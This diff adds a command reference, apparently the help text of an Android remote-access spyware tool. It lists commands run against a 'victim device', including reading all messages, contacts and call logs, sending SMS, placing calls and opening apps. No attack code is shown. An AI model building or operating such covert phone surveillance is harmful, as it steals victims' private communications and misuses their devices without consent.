@@ -1,0 +1,16 @@
+DEVICE_DETAILS: Returns device information,
+INSTALLED_APPS: Returns all installed apps (package names),
+VIBRATE option(time in seconds): Vibrates the phone,
+MAKE_CALL number(required): Places a call to the given number,
+GET_MESSAGES option(DD/MM/YYYY): Returns all messages from the target device if we specify the date it will return messages on that date,
+SEND_MESSAGE number(required) message(any length with or without spaces): Sends message to the given number,
+OPEN_APP package_name(required): opens specific app in the victim device(some apps may not able to open),
+VOLUME (options):
+                INCREASE_VOLUME: INcreases the volume by 1 point;
+                DECREASE_VOLUME: Decreases the volume by 1 point;
+                RING: It rings the mobile;
+                MUTE: Mutes the ringtone;
+                UNMUTE: Unmutes the ringtone;
+GET_CONTACTS: Returns all saved contacts;
+GET_CALL_LOGS: Returns all call logs;
+      
